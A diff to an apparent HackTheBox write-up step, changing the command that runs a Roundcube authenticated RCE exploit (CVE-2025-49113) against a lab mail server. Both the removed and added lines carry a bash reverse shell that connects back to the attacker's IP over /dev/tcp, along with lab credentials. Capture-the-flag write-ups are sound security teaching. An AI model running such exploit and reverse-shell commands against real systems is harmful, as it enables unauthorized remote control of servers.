@@ -44,7 +44,7 @@
 
 4. Googling for Roundcube exploits, we find a PHP Authenticated Remote Code Execution script. Running the script, we confirm we have RCE on the target machine
 
-`sudo php /opt/CVE-2025-49113-Roundcube-Authenticated-RCE.php http://mail.outbound.htb/roundcube/ tyler LhKL1o9Nm3X2 'sh -i >& /dev/tcp/10.10.14.176/80 0>&1'`
+`sudo php /opt/CVE-2025-49113-Roundcube-Authenticated-RCE.php http://mail.outbound.htb/roundcube/ tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.14.176/80 0>&1"'`
 
 <img width="849" height="155" alt="image" src="https://github.com/user-attachments/assets/f8cfbd2e-02b1-4ad4-ac84-b3c289ecee64" />
 
